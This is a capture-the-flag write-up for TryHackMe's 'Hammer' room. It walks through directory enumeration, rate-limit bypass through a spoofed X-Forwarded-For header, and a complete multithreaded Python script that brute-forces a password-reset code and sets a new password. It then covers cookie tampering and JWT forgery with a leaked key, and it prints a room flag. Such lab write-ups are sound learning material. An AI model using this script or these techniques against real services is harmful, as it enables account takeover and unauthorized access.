Platform: TryHackMe
Room: Hammer
Difficulty: Medium

# Task : 
1. What is the flag value after logging in to the dashboard?
2. What is the content of the file /home/ubuntu/flag.txt?

# Let's Solve :

### Nmap Scan
After getting the IP Address, let's NMAP it to find the services running and the ports opened. 
And the results are :
![NmapScan](images/nmap_hammer.png.png)

### Dashboard
We notice that, a port : 1337 is open and hosting webpage server. 
On viewing on the search engine we get a login dashboard as follows :
![DashBoard](images/dashboard.png)

### Source Code 
It is good practice to analyze the source code , before initiating to sub-domain enumeration, as sometimes we may get clue about the naming convention used by the developer of the directories and sub-domains.
The Source Code is shows as below :
![SourceCode](images/source_code_hammer_thm)
The source clearly states that the conventions for the sub-domains is : hmr_Directory_Name. Which means that , every dirctory listed will start with "hmr_".
So to enumerate the directories we need to first have the wordlist with the modification as required.
We will modify the word list : sed `'s/^/hmr/' words.txt > new_words.txt`.
Executing as follows :
![Modifying list](images/modifying_list)
So, its now we are ready with the word list to enumerate the directories.

### Enumerating Directories :
We will be enumerating the directories using the FeroxBuster, due to its fast nature and supports recurssive scanning.
After successful enumeration we get :
![Ferox Buster](images/FerroxOxide)
We were able to get two interesting directories as underlined in the above image. They are :
1. hmr_logs
2. errors.logs
The significance of these two is quite unavoidable, because in the login form we donot have any known email address that we can use to break the login page. The plan should be to get any email address so that we can us the forgot password option, and as a good news we get an email address as shown below :
Interface of "\hmr_logs":
![hmr_logs](images/hmr_logs)

What we get inside "errors.log" : (its interesting)
![hmr_errors](images/hmr_errors)

Now , we have an email address : tester@hammer.thm.
We will be using it for the Authentication Bypass.

### Authentication Bypass

We first need to analyze the login form (mostly the forgot password), we then be able to get an idea about how the password reset works.
The Forgot Password page looks somethng like this :
![Forgot Password](images/forgot_hammer.png)
On entering submit, we get a page asking us to enter the recovery code sent to the respective email address.
And it looks something like this :
![Recovery Code](images/forgot_time.png)
One thing to notice is that we are required to enter the recovery code within 180 seconds , which means if we are trying brute force then we have to do it within 180 seconds.
One more thing to mention is that, the recovery code form allows us to take 9 attempts only, which means that using an ip address we can only atttempt for 9 times.
We can bypass this mechanism using : `X-Forwarded-For: <random_ip_address>`.
Using this in the header we can simply bypass the counting for an ipaddress, we just need to change the ip address before we reach the 9th attempt.
There are other Header too for IP Spoofing, which you can check it out from [owasp.org](https://owasp.org/www-community/pages/attacks/ip_spoofing_via_http_headers).
Let me present the images which shows how to spoof the ip address uing the X-Forwarded-For.
1st image shows the usage of the X-Forwarded-For usage.(shown below)
![ip_spoofing](images/ip_spoofing_1.png)
2nd image shows the usage of the new ip and in response to it gets a new rate count.
![ip_spoofing](images/ip_spoofing_2.png).

Now that we have overcome one challenge, in bypassing the rate count in the code recovery form, our next job is to automate the porcess of brute force and that should be within 180 seconds.
For that, we can write a code in Python or we can surf the internet to get a code or simply use any AI chatbot.
I surfed and got a code which is as follows :
```
import requests
import random
import threading
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

url = "http://<ip_address>:1337/reset_password.php"
num_threads = 50
stop_flag = threading.Event()

# Retry mechanism
retry_strategy = Retry(
    total=5,
    backoff_factor=1,
    status_forcelist=[500, 502, 503, 504],
    raise_on_status=False
)

adapter = HTTPAdapter(max_retries=retry_strategy)
session = requests.Session()
session.mount("http://", adapter)

def brute_force_code(start, end):
    for code in range(start, end):
        code_str = f"{code:04d}"
        try:
            r = session.post(
                url,
                data={"recovery_code": code_str, "s": "180"},
                headers={
                    "X-Forwarded-For": f"127.0.{random.randint(0, 255)}.{random.randint(0, 255)}"
                },
                timeout=10,
                allow_redirects=False,
            )
            if stop_flag.is_set():
                return
            elif r.status_code == 302:
                stop_flag.set()
                print("[-] Timeout reached. Try again.")
                return
            elif "Invalid or expired recovery code!" not in r.text:
                stop_flag.set()
                print(f"[+] Found the recovery code: {code_str}")
                print("[+] Sending the new password request.")
                new_password = "Password123"
                session.post(
                    url,
                    data={
                        "new_password": new_password,
                        "confirm_password": new_password,
                    },
                    headers={
                        "X-Forwarded-For": f"127.0.{random.randint(0, 255)}.{random.randint(0, 255)}"
                    },
                )
                print(f"[+] Password is set to {new_password}")
                return
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
            continue

def main():
    print("[+] Sending the password reset request.")
    session.post(url, data={"email": "tester@hammer.thm"})
    print("[+] Starting the code brute-force.")
    code_range = 10000
    step = code_range // num_threads
    threads = []
    for i in range(num_threads):
        start = i * step
        end = start + step
        thread = threading.Thread(target=brute_force_code, args=(start, end))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
```
In the above code, we only need to update the ip_address of our machine.
On running the code :`python3 brute.py`. We are able to bypass the password reset page and also we have changed the password to : `Password123`.
![password_reset](images/Password_reset.png).

Now we are at the verge of completing the first task to bypass the login form, and we are successful at that. 
![dashboard](images/dashboard_login.png)

### Privelege Escalation 
In the given dashboard we can enter linux commands, so as to check which are the commands we can run or not, we can brute force it. 
So the list of all the linux commands available are :[linux commands](https://github.com/theOrthodox/linux-fundametals/blob/main/linux%20commands)
We will then capture the request command made using BurpSuite and save it as text.
![command request](images/command_request.png)
Now, we have enough for fuzzing. Let's do it :
![fuzzing](images/fuzzing.png)
After doing fuzzing we clearly see that we are only allowed to use single command : 'ls'
One more thing is that, we get logged out of the dashboard automatically.So again we must see the source code of the web page, which is as follows :
```

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard</title>
    <link href="/hmr_css/bootstrap.min.css" rel="stylesheet">
    <script src="/hmr_js/jquery-3.6.0.min.js"></script>
    <style>
        body {
            background: url('/hmr_images/hammer.webp') no-repeat center center fixed;
            background-size: cover;
        }
        .container {
            position: relative;
            z-index: 10; /* Make sure the content is above the background */
            background-color: rgba(255, 255, 255, 0.8); /* Slight white background for readability */
            padding: 20px;
            border-radius: 10px;
        }
    </style>
	
	    <script>
       
        function getCookie(name) {
            const value = `; ${document.cookie}`;
            const parts = value.split(`; ${name}=`);
            if (parts.length === 2) return parts.pop().split(';').shift();
        }

      
        function checkTrailUserCookie() {
            const trailUser = getCookie('persistentSession');
            if (!trailUser) {
          
                window.location.href = 'logout.php';
            }
        }

       
        setInterval(checkTrailUserCookie, 1000); 
    </script>

</head>
<body>
<div class="container mt-5">
    <div class="row justify-content-center">
        <div class="col-md-6">
            <h3>Welcome, Thor! - Flag: THM{AuthBypass3D}</h3>
            <p>Your role: user</p>
            
            <div>
                <input type="text" id="command" class="form-control" placeholder="Enter command">
                <button id="submitCommand" class="btn btn-primary mt-3">Submit</button>
                <pre id="commandOutput" class="mt-3"></pre>
            </div>
            
            <a href="logout.php" class="btn btn-danger mt-3">Logout</a>
        </div>
    </div>
</div>

<script>
$(document).ready(function() {
    $('#submitCommand').click(function() {
        var command = $('#command').val();
        var jwtToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzcyOTEyMTI2LCJleHAiOjE3NzI5MTU3MjYsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.KAf1sL3KvOEnL348R-q2TphoxR8ZH_9K7iTGLz47F9A';

        // Make an AJAX call to the server to execute the command
        $.ajax({
            url: 'execute_command.php',
            method: 'POST',
            data: JSON.stringify({ command: command }),
            contentType: 'application/json',
            headers: {
                'Authorization': 'Bearer ' + jwtToken
            },
            success: function(response) {
                $('#commandOutput').text(response.output || response.error);
            },
            error: function() {
                $('#commandOutput').text('Error executing command.');
            }
        });
    });
});
</script>
</body>
</html>
```
The script clearly mentions that, whenever there is a null value in the cookies it logs the user out.To clear things more easily :
```
Page loads
     ↓
Every 1 second
     ↓
Check if cookie "persistentSession" exists
     ↓
YES → User stays logged in
NO  → Redirect to logout.php
```
So to bypass this we can simply extend expiry of the token and persistenceSession and set the value of persistenceSession to `yes`. We can do it using the `Developer tool -> Application -> Storage -> cookies`.
As shown :
![changing cookies](images/cookies.png)

Now, our next step is to escalate our privileges so to get the flag.
For that we should analyze the JWT Token.
We can get the JWT token from the request send by our burp suite. 
As shown below:
![JWT TOKEN](images/jwt.png)

So we can now edit it in the jwt.io(older version) : [jwt.io](https://jwt.lannysport.net/).
Before edditing, we need to download a key which is available, we saw it once we did `ls`.
On going to `http:<ip_address>:1337/188ade1.key`, we will get a key :

![key](images/key.png)

Now, we can edit in the jwt.io as mentioned above, and as shown below :

![jwt editting](images/jwt_editting.png)

Next we paste it in our Repeater's request : 
![privilege escalation](images/privilege_escalation.png)

So, Hurray !!! 
we got an escalation.
lets see whether we can get the flag.
And Yess, we got it!!!




























